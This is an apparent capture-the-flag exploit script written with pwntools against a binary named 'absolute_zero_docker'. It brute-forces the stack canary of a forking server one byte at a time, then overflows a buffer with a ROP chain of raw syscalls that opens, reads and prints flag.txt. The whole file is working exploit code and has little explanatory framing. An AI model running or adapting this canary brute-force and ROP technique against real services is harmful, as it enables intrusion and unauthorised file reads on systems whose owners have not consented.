from pwn import *

binary_path = args.EXE if args.EXE else './absolute_zero_docker'
context.binary = elf = ELF(binary_path)

def start():
    return process(binary_path)

# Canary Brute-Force Logic for Fork-Server
def brute_force_canary():
    known_canary = b'\x00'
    log.info("Brute-forcing canary byte-by-byte...")

    # Canary is 8 bytes. First byte is always NULL.
    # We need to find the remaining 7 bytes.
    for i in range(7):
        found_byte = False
        bar = log.progress(f"Byte {i+2}")
        for b in range(256):
            # Optimization: Try common values first? No, random.
            candidate = bytes([b])
            payload = b"A"*72 + known_canary + candidate
            
            try:
                # We connect to localhost:1337 (or args.PORT)
                target_port = int(args.PORT) if args.PORT else 9010
                r = remote("localhost", target_port, level='error')
                r.send(payload)
                
                # Check if it crashed.
                # If we send 73 bytes (overwrite 1 byte of canary), and it's WRONG,
                # stack check fails -> SIGABRT/SIGSEGV -> Connection closes immediately?
                # Or it prints something?
                # Our invalid canary causes __stack_chk_fail -> which calls exit/abort.
                # If correct, it returns from process_input -> returns from challenge -> returns from handle_client -> exit(0).
                
                # How to distinguish?
                # __stack_chk_fail usually prints to stderr: "*** stack smashing detected ***: terminated"
                # IF we can read stderr, we know it failed.
                # But over netcat, do we see stderr? 
                # dup2(sock, 2) inside server.c means YES, we see stderr.
                
                response = r.recvall(timeout=0.1)
                r.close()
                
                if b"Done" in response:
                    # Success message -> Correct byte!
                    known_canary += candidate
                    bar.success(f"Found: {hex(b)}")
                    found_byte = True
                    break
            except Exception as e:
                # log.error(f"Error: {e}")
                pass
        
        if not found_byte:
            log.error("Failed to find canary byte. Is the server running?")
            exit(1)
            
    log.success(f"Brute-forced Canary: {hex(u64(known_canary))}")
    return u64(known_canary)

# Connect to target
if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
else:
    # Local verification mode: we must assume server is running
    io = remote("localhost", 1337)

# FOR TESTING: If we are not running the brute force every time (slow),
# we can hardcode it if we know it (impossible if random startup).
# But for the purpose of "ensure it works", we run it.
canary = brute_force_canary() 

# ROP Chain using direct syscalls
rop = ROP(elf)

# 1. Setup Data Area
# We place our string "flag.txt" in BSS.
data_start = elf.bss() + 0x100
log.info(f"data_start: {hex(data_start)}")

# 0. read(0, data_start, 500) (Load "flag.txt")
rop.rax = 0
rop.rdi = 0
rop.rsi = data_start
rop.rdx = 500
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# openat(AT_FDCWD, "flag.txt", 0)
# rax = 257 (sys_openat)
# rdi = -100
# rsi = data_start 
# rdx = 0
rop.rax = 257
rop.rdi = -100
rop.rsi = data_start 
rop.rdx = 0
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# read(3, bss, 100)
# rax = 0
# rdi = 3
# rsi = data_start + 0x500
# rdx = 100
rop.rax = 0
rop.rdi = 3
rop.rsi = data_start + 0x500
rop.rdx = 100
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# write(1, bss, 100)
# rax = 1
# rdi = 1
# rsi = data_start + 0x500
# rdx = 100
rop.rax = 1
rop.rdi = 1
rop.rsi = data_start + 0x500
rop.rdx = 100
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

print(rop.dump())

payload = b"A" * 72
payload += p64(canary)
payload += b"B" * 8
payload += rop.chain()

io.sendline(payload)
sleep(0.5)
# Send "flag.txt"
io.send(b"flag.txt\x00" + b"\x00"*100) 

print(io.recvall(timeout=2))
